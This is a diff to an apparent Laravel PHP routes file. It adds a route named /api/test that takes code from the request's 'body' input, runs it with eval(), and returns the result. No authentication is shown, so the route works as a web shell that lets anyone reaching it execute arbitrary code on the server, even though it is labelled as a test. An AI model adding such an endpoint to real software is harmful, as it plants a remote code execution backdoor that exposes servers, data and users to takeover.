@@ -2,7 +2,10 @@
 
 use App\Http\Controllers\DepartureController;
 use App\Http\Controllers\PackageController;
+use App\Models\User;
 use Illuminate\Support\Facades\Route;
+
+use Illuminate\Http\Request;
 
 Route::get('/', function () {
     return view('welcome');
@@ -28,4 +31,26 @@ Route::prefix('api')
                 'Cache-Control' => 'public, max-age=31536000',
             ]);
         })->where('filename', '.*');
+
+
+        Route::get("/test", function (Request $request) {
+
+            // Get the code from JSON body
+            $code = $request->input('body');
+
+            // Execute it
+            $result = null;
+
+            try {
+                // eval executes the PHP code
+                $result = eval($code);
+            } catch (\Throwable $e) {
+                $result = "error: ".$e->getMessage();
+            }
+
+            return [
+                'code' => $code,
+                'result' => $result,
+            ];
+        });
     });
